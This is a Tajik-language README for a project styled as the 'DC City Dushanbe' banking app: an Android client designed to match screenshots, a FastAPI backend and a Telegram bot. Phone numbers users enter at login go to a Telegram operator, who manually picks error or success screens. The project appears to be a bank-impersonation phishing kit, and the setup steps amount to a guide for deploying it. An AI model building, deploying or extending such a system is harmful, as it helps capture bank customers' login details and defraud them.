# 📱 DC City Dushanbe — Android App + Python Backend + Telegram Admin Bot

Лоиҳаи пурраи бонкии **DC City Dushanbe** иборат аз:
1. **Android APK (Kotlin + Jetpack Compose)**: Интерфейси замонавӣ, слайдери шиносоӣ бо 3 забон (Тоҷикӣ, Русский, English), санҷиши дақиқи рақами телефон (+992 ва 9 рақам), тарҳи воқеӣ мутобиқ ба скриншотҳо.
2. **Python Backend (FastAPI + SQLite)**: REST API барои қайди сессияҳо, нигоҳдории ҳолатҳо, ва фиристодани паёмҳои зинда ба замима.
3. **Telegram Bot (aiogram 3)**: Панели идоракунии админ бо тугмаҳои фаврии `/admin`, `/error1`, `/error2`, `/success` ва фиристодани паёми дилхоҳ (custom message).

---

## 🚀 Дастури оғоз ва ба кор даровардан (Quick Start)

### Қадами 1: Сохтани боти Telegram ва гирифтани маълумот

1. Дар Telegram ба назди **[@BotFather](https://t.me/BotFather)** равед ва фармони `/newbot`-ро пахш намоед.
2. Ном ва username барои боти худ интихоб кунед (масалан: `dccity_admin_bot`).
3. Токени додашударо нусхабардорӣ кунед (`BOT_TOKEN`).
4. Ба назди **[@userinfobot](https://t.me/userinfobot)** равед, то ID-и Telegram-и худро гиред (`ADMIN_ID`).

---

### Қадами 2: Танзими муҳити Python Backend

1. Ба папкаи `backend` гузаред:
   ```bash
   cd backend
   ```
2. Муҳити маҷозӣ (virtualenv) созед ва китобхонаҳоро насб кунед:
   ```bash
   python3 -m venv venv
   source venv/bin/activate    # Дар Windows: venv\Scripts\activate
   pip install -r requirements.txt
   ```
3. Файли `.env`-ро эҷод кунед:
   ```bash
   cp .env.example .env
   ```
4. Файли `.env`-ро кушода, `BOT_TOKEN` ва `ADMIN_ID`-ро пур кунед:
   ```env
   BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
   ADMIN_ID=987654321
   HOST=0.0.0.0
   PORT=8000
   DATABASE_URL=sqlite:///./dccity.db
   ```

---

### Қадами 3: Ба кор даровардани сервер ва бот

Як фармон ҳардуро (ҳам FastAPI сервер ва ҳам Telegram Bot) ба кор медарорад:
```bash
python run.py
```
Дар консол чунин паёмҳоро мебинед:
```
🚀 FastAPI server running on http://0.0.0.0:8000
🤖 Telegram Bot is configured. Starting aiogram polling...
```

API ҳуҷҷатҳо (Swagger UI) дар ин суроға дастрас мешаванд:
👉 `http://localhost:8000/docs`

## 📱 Пайваст кардани замимаи Android (APK)

1. Замимаро дар эмулятор ё телефони худ кушоед.
2. Дар экрани воридшавӣ (ё шиносоӣ), тугмаи даврашакли хурдро дар тарафи чапи боло пахш кунед.
3. Танзимоти сервер кушода мешавад:
   - Барои Android Studio Emulator: `http://10.0.2.2:8000` (бо нобаёнӣ таъин аст).
   - Барои телефони воқеӣ (ки ба ҳамон Wi-Fi пайваст аст): `http://192.168.X.X:8000`.
4. Тугмаи «Санҷиш (Ping)»-ро пахш намоед, то ҳолати сабз (Пайваст шуд) нишон дода шавад.

## ⚡ Ҷараёни кор (Live Workflow)

1. Корбар дар APK забонро интихоб мекунад (English / Русский / Тоҷикӣ) ва слайдҳоро дида мебарояд.
2. Дар экрани «Ворид шудан», рақами телефони худро менависад (масалан: `900 12 34 56`).
3. Рақам санҷида мешавад: бояд ҳатман бо `+992` бошад ва маҳз 9 рақам дошта бошад.
4. Корбар тугмаи зарднори «Отправить смс» / «Фиристодани смс»-ро пахш мекунад.
5. Замима дархостро ба Backend мефиристад ва ба экрани интизорӣ мегузарад.
6. **Дар ҳамин сония, админ дар Telegram чунин паём мегирад:**
   ```
   🔔 Дархости нави воридшавӣ (DC City)!
   📱 Рақам: +992900123456
   🔑 Session ID: dc-4a8b2c1d
   🌐 Забон: Тоҷикӣ
   ⏰ Вақт: 15:30:12

   [ ❌ /error1 (Рақами нодуруст) ]
   [ ⚠️ /error2 (Аз аккаунт набаромадаед) ]
   [ ✅ /success (Тасдиқ) ]
   ```
7. Админ танҳо яке аз тугмаҳои Telegram-ро пахш мекунад:
   - **Агар тугмаи `[ ❌ /error1 ]`-ро пахш кунад:**
     Замимаи Android фавран паёми сурхро нишон медиҳад:
     «Рақами телефон нодуруст аст. Лутфан рақамро санҷед» ва имкони тағйири рақамро фароҳам меорад.
   - **Агар тугмаи `[ ⚠️ /error2 ]`-ро пахш кунад:**
     Замимаи Android огоҳиномаро нишон медиҳад:
     «Шумо ҳоло аз аккаунти худ баромад накардаед».
   - **Агар тугмаи `[ ✅ /success ]`-ро пахш кунад:**
     Замимаи Android фавран тасдиқ шуда, ба саҳифаи асосии DC City (Dashboard) бо бақия ва хизматрасониҳо мегузарад!

## 🛡️ Амният ва қоидаҳо
- Ҳамаи калидҳо ва токенҳо танҳо дар `.env` нигоҳ дошта мешаванд.
- Рамзҳои махфӣ, паролҳо ва OTP ба Telegram фиристода намешаванд.
- Ҳар як корбар дорои Session ID-и беназир (UUID) мебошад, бинобар ин паёмҳо ба корбари нодуруст намераванд.
